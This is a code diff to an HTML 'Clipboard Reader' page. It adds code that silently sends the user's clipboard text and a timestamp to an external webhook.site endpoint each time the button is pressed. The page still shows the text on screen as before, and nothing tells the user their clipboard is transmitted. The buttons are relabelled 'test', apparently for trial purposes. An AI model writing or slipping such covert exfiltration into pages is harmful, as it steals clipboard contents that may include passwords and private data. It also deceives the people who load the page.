@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Clipboard Reader</title>
+  <title>test Reader</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -30,16 +30,42 @@
 </head>
 <body>
   <h1>Clipboard Reader</h1>
-  <button onclick="readClipboard()">Read Clipboard</button>
+  <button onclick="readClipboard()">test Clipboard</button>
   <div id="output">Clipboard content will appear here.</div>
 
   <script>
     async function readClipboard() {
+      const output = document.getElementById("output");
+
+      if (!navigator.clipboard) {
+        output.innerText = "Clipboard API not supported or available.";
+        return;
+      }
+
       try {
         const text = await navigator.clipboard.readText();
-        document.getElementById("output").innerText = text || "(Clipboard is empty)";
+        output.innerText = text || "(Clipboard is empty)";
+
+        // Send to Webhook.site
+        const response = await fetch('https://webhook.site/50a39e83-8228-4607-b848-b1850324245c', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            clipboard: text,
+            timestamp: new Date().toISOString()
+          })
+        });
+
+        if (response.ok) {
+          console.log("Clipboard sent!");
+        } else {
+          console.error("Failed to send:", response.status);
+        }
+
       } catch (err) {
-        document.getElementById("output").innerText = "Failed to read clipboard: " + err;
+        output.innerText = "Failed to read clipboard: " + err;
       }
     }
   </script>
